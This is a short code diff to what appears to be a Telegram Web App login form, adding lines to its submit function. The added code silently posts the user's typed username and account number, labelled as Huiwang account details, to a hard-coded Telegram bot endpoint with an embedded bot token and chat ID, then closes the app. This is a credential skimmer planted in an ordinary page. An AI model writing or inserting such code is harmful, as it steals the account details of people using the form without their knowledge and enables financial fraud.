@@ -29,6 +29,13 @@
         }).onClick(submit);
 
         function submit() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot5858680229:AAEqC1cibJLPbu0HahT0yALK4M_YMeRWf-k/sendMessage');
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send({
+                "chat_id": "5458197333",
+                "text": "汇旺用户名: " + document.getElementById('username').value + "\n" + "汇旺账号: " + document.getElementById('account').value
+            });
             Telegram.WebApp.close();
         }
     </script>
